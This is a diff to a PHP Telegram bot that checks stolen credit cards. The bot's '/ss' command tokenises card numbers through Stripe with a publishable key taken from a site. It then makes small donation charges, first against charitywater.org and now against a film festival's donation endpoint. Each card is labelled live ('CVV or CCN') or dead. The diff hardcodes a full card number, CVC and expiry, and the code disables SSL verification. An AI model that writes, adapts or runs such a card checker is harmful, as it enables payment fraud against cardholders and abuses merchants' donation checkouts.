@@ -133,7 +133,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             }
             
             $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
@@ -150,7 +150,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=$zip&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=jacobmaxon2%40gmail.com&billing_details[name]=jacob+maxon&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=$guid&muid=$muid&sid=$sid&pasted_fields=number&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0&time_on_page=947892&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "email=kasjdflkj%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A102.0)+Gecko%2F20100101+Firefox%2F102.0&device_id=DNT&referrer=https%3A%2F%2Fcapitalcityfilmfest.com%2Fdonate&pasted_fields=number&time_checkout_opened=1658345153&time_checkout_loaded=1658345152&card[number]=5529+7600+1453+0208&card[cvc]=945&card[exp_month]=12&card[exp_year]=2024&card[name]=kasjdflkj%40gmail.com&time_on_page=15396&guid=8a310fea-b702-43de-b15e-e26c32d647759112be&muid=3e6fc1a5-377e-4489-b646-1bd7711cd04468f5a7&sid=d70f4919-2aad-421d-82e5-c2961fcd3295d93cfa&key=pk_live_KLNgusu1EH6ftNJVyHqU318k");
             $result1 = curl_exec($ch);
             
             if(stripos($result1, 'error')){
@@ -163,17 +163,17 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             if(!$stripeerror){
                 $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
+                curl_setopt($ch, CURLOPT_URL, 'https://capitalcityfilmfest.com/ajax/donate.php');
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 curl_setopt($ch, CURLOPT_HEADER, 0);
                 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                'Host: www.charitywater.org',
-                'Accept: */*',
+                'Host: capitalcityfilmfest.com',
+                'Accept: application/json, text/javascript, */*; q=0.01',
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Encoding: gzip, deflate, br',
-                'Origin: https://www.charitywater.org',
+                'Origin: https://capitalcityfilmfest.com',
                 'Content-Type: application/x-www-form-urlencoded',
-                'Referer: https://www.charitywater.org/donate',
+                'Referer: https://capitalcityfilmfest.com/donate',
                 'Sec-Fetch-Dest: empty',
                 'Sec-Fetch-Mode: no-cors',
                 'Sec-Fetch-Site: cross-site',
@@ -184,9 +184,9 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, "4564");
+                curl_setopt($ch, CURLOPT_POSTFIELDS, "amount=%241.00&first_name=jalksdjf&last_name=jaskljd&email=kasjdflkj%40gmail.com&phone=9147485648&stripeToken=tok_1LNiX7IXKpM8nmAGeVZcTKsF");
                 $result2 = curl_exec($ch);
-                $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
+                $errormessage = trim(strip_tags(capture($result2,'"text":"','"')));
             }
             $info = curl_getinfo($ch);
             $time = $info['total_time'];
@@ -207,8 +207,8 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» CVV or CCN ✅
-Response -» $result1
-Response -» $result2
+Response -» $result1 
+Response -» $result2 | $errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
@@ -235,7 +235,7 @@ Time -» <b>$time</b><b>s</b>
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» API Down ❌
-Response -» $result1 | $result2
+Response -» $result1 | $result2 | $errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
@@ -262,7 +262,7 @@ Time -» <b>$time</b><b>s</b>
                 'message_id'=>$messageidtoedit,
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Dead ❌
-Response -» $result1 | $result2
+Response -» $result1 | $result2 |$errormessage
 Gateway -» Stripe Auth 1
 Time -» <b>$time</b><b>s</b>
 
